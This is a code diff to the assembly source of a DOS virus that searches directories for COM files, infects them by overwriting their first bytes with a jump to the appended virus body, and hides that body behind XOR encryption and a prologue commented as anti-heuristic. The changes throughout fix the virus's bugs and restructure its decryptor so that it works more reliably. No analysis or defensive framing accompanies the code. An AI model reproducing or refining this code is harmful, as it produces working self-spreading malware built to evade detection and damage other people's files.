@@ -31,38 +31,14 @@ VirusSize	equ	EndVirus-BeginVirus
 ;---------------------------------------------------------------------
 
 BeginVirus:
-	push	ax
-	pop	ax
-	push	ax
-	pop	ax
-	call	@@delta
-@@delta:pop	bp					; bp holds current location
-	sub	bp, offset @@delta			; calculate delta offset
-
-	mov	si, word ptr [bp+Key]
-	lea	di, [bp+BeginEncryptedSection]
-	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2-1
-
-	xor	word ptr [di], si
-	inc	di
-	inc	di
-
-	push	cs
-	lea	ax, [bp+EncryptDecrypt]
-	push	ax					; push address to decryptor
-
-	jmp	BeginEncryptedSection
-
-Key	dw	0
+	jmp	EntryPoint
 
 ;---------------------------------------------------------------------
 ;	Start of encrypted section
 ;---------------------------------------------------------------------
 
 BeginEncryptedSection:
-	db	0c3h					; return
-VirusBody:
-	lea	si, [bp+offset Old3Buf]
+	lea	si, [bp+offset OldJmp]
 	mov	di, 100h
 	push	di
 	movsw
@@ -131,7 +107,7 @@ TryAnotherFile:
 	ret						; return to traverse loop
 
 @@next:	lea	si, [bp+offset Dta+15h]			; Start from attributes
-	mov	cx, 9					; Finish with size
+	mov	cx, 5					; attribute, time, date
 	lea	di, [bp+offset FileAttr]		; Move into your locations
 	rep	movsb
 
@@ -143,20 +119,23 @@ TryAnotherFile:
 	mov	ax, 3d02h
 	lea	dx, [bp+offset Dta+30]			; File name is located in DTA
 	int	21h
+	jnc	@@opened				; opened ok
+	jmp	RestoreAttr				; open failed -- skip handle ops, just restore attrs
+@@opened:
 	xchg	ax, bx
 
 	mov	ah, 3fh
-	lea	dx, [bp+Old3Buf]
+	lea	dx, [bp+OldJmp]
 	mov	cx, 3
 	int	21h
 
 	mov	ax, word ptr [bp+Dta+26]		; ax = filesize
-	add	ax, offset BeginVirus-106h		; calculate entry offset to jmp
-	mov	word ptr [bp+New3Buf+1], ax		; save jmp
+	add	ax, offset EntryPoint-103h		; calculate entry offset to jmp
+	mov	word ptr [bp+NewJmp+1], ax		; save jmp
 
-	sub	ax, VirusSize				; calculate entry offset to jmp
+	sub	ax, VirusSize				; = pre-infection size; self-recognition compare
 
-	mov	cx, word ptr [bp+Old3Buf+1]		; jmp location
+	mov	cx, word ptr [bp+OldJmp+1]		; jmp location
 	cmp	ax, cx					; if same, already infected
 	jnz	InfectComFile				; so quit out of here
 	jmp	CloseFile
@@ -215,7 +194,7 @@ InfectComFile:
 	push	cs
 	pop	ds
 
-	lea	si, [bp+New3Buf]			; replace the 3 first bytes
+	lea	si, [bp+NewJmp]			; replace the 3 first bytes
 	xor	di, di
 	movsw
 	movsb
@@ -259,6 +238,7 @@ CloseFile:
 	mov	ah, 3eh
 	int	21h
 
+RestoreAttr:
 	mov	ax, 04301h				; DOS set file attrib. function
 	xor	ch, ch
 	mov	cl, [bp+FileAttr]			; Restore all attributes
@@ -286,8 +266,8 @@ Nest	dw	0
 BackDir	db	'..', 0
 DirMask	db	'*.*', 0
 ComMask	db	'*.com', 0
-Old3Buf	db	0cdh, 20h, 0
-New3Buf	db	0e9h, 0, 0
+OldJmp	db	0cdh, 20h, 0
+NewJmp	db	0e9h, 0, 0
 
 EndEncryptedSection:
 
@@ -300,7 +280,24 @@ EncryptDecrypt:
 	inc	di
 	inc	di
 	loop	EncryptDecrypt
-	jmp	VirusBody
+	ret
+
+Key	dw	0
+
+EntryPoint:
+	push	ax					; anti-heuristic prologue
+	pop	ax
+	push	ax
+	pop	ax
+	call	@@delta
+@@delta:pop	bp					; bp holds current location
+	sub	bp, offset @@delta			; calculate delta offset
+
+	mov	si, word ptr [bp+Key]			; decryption key
+	lea	di, [bp+BeginEncryptedSection]
+	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
+	call	EncryptDecrypt				; decrypt the body
+	jmp	BeginEncryptedSection			; and run it
 
 EndVirus:
 
@@ -311,7 +308,6 @@ EndVirus:
 FileAttr	db	?
 FileTime	dw	?
 FileDate	dw	?
-FileSize	dd	?				; written by the 9-byte copy above; never read back
 Dta		db	42 dup (?)
 
 end
